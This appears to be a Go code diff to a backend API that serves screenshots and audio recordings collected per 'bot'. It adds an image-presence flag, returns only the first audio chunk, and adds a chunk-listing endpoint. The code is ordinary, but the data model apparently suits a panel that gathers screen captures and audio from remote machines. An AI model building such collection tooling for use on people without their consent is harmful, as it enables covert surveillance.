@@ -40,6 +40,7 @@ type screenshotMeta struct {
 	Timestamp  time.Time `json:"Timestamp"`
 	SessionID  string    `json:"SessionID,omitempty"`
 	Difference *float64  `json:"Difference,omitempty"`
+	HasImage   bool      `json:"HasImage"`
 }
 
 // Screenshots is GET /api/v1/screenshots?id=<bot_id>&limit=&offset=
@@ -50,24 +51,14 @@ func (a *MediaAPI) Screenshots(w http.ResponseWriter, r *http.Request) {
 		return
 	}
 	limit, offset := parseLimitOffset(r, 50)
-	var rows []models.BotScreenshot
-	if err := a.DB.Select("id, bot_id, url, title, timestamp, session_id, difference").
+	var out []screenshotMeta
+	if err := a.DB.Table("bot_screenshots").
+		Select("id, bot_id, url, title, timestamp, session_id, difference, (COALESCE(image_data, '') != '') as has_image").
 		Where("bot_id = ?", id).
-		Order("timestamp DESC").Limit(limit).Offset(offset).Find(&rows).Error; err != nil {
+		Order("timestamp DESC").Limit(limit).Offset(offset).
+		Find(&out).Error; err != nil {
 		JSONErr(w, http.StatusInternalServerError, "query failed")
 		return
-	}
-	out := make([]screenshotMeta, 0, len(rows))
-	for _, s := range rows {
-		out = append(out, screenshotMeta{
-			ID:         s.ID,
-			BotID:      s.BotID,
-			URL:        s.URL,
-			Title:      s.Title,
-			Timestamp:  s.Timestamp,
-			SessionID:  s.SessionID,
-			Difference: s.Difference,
-		})
 	}
 	JSONOK(w, out)
 }
@@ -207,38 +198,56 @@ func parseTime(s string) time.Time {
 }
 
 // AudioSessionMerge is GET /api/v1/audio-session/{session_id}
-// Concatenates all chunks of a session into one audio/webm response.
+// Returns the first chunk of a session as audio/webm. Multi-chunk sessions
+// should use AudioSessionChunks to get chunk IDs and play them sequentially.
 func (a *MediaAPI) AudioSessionMerge(w http.ResponseWriter, r *http.Request) {
 	sid := chi.URLParam(r, "session_id")
 	if sid == "" {
 		JSONErr(w, http.StatusBadRequest, "session_id required")
 		return
 	}
-	var rows []models.BotRecording
-	if err := a.DB.Where("session_id = ?", sid).Order("timestamp ASC").Find(&rows).Error; err != nil {
-		JSONErr(w, http.StatusInternalServerError, "query failed")
-		return
-	}
-	if len(rows) == 0 {
+	var row models.BotRecording
+	if err := a.DB.Where("session_id = ?", sid).Order("timestamp ASC").First(&row).Error; err != nil {
 		JSONErr(w, http.StatusNotFound, "session not found")
 		return
 	}
-	var buf []byte
-	for _, row := range rows {
-		chunk := row.Recording
-		// Strip data-URL prefix if present
-		if idx := strings.Index(chunk, ";base64,"); idx != -1 {
-			chunk = chunk[idx+len(";base64,"):]
-		}
-		decoded, err := base64.StdEncoding.DecodeString(chunk)
-		if err != nil {
-			buf = append(buf, []byte(row.Recording)...)
-		} else {
-			buf = append(buf, decoded...)
-		}
+	chunk := row.Recording
+	if idx := strings.Index(chunk, ";base64,"); idx != -1 {
+		chunk = chunk[idx+len(";base64,"):]
+	}
+	decoded, err := base64.StdEncoding.DecodeString(chunk)
+	if err != nil {
+		w.Header().Set("Content-Type", "audio/webm")
+		_, _ = w.Write([]byte(row.Recording))
+		return
 	}
 	w.Header().Set("Content-Type", "audio/webm")
-	_, _ = w.Write(buf)
+	_, _ = w.Write(decoded)
+}
+
+type audioChunkMeta struct {
+	ID        uuid.UUID `json:"id"`
+	Timestamp time.Time `json:"timestamp"`
+}
+
+// AudioSessionChunks is GET /api/v1/audio-session/{session_id}/chunks
+// Returns ordered chunk metadata for sequential playback.
+func (a *MediaAPI) AudioSessionChunks(w http.ResponseWriter, r *http.Request) {
+	sid := chi.URLParam(r, "session_id")
+	if sid == "" {
+		JSONErr(w, http.StatusBadRequest, "session_id required")
+		return
+	}
+	var out []audioChunkMeta
+	if err := a.DB.Table("bot_recordings").
+		Select("id, timestamp").
+		Where("session_id = ?", sid).
+		Order("timestamp ASC").
+		Find(&out).Error; err != nil {
+		JSONErr(w, http.StatusInternalServerError, "query failed")
+		return
+	}
+	JSONOK(w, out)
 }
 
 // AudioChunk is GET /api/v1/audio/{id}
